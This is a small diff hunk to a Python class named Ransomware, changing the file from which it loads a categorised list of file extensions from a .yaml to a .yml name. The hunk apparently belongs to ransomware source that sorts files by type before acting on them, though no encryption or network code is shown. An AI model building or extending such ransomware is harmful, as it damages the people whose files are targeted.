@@ -43,7 +43,7 @@ class Ransomware:
                 self.server.close()
 
     def list_file(self) -> Dict[str, List[str]]:
-        with open('scripts/extensions.yaml', 'r') as file:
+        with open('scripts/extensions.yml', 'r') as file:
             exts = safe_load(file)
 
         self.file_categories: Dict[str, List[str]] = {category: [] for category in exts}
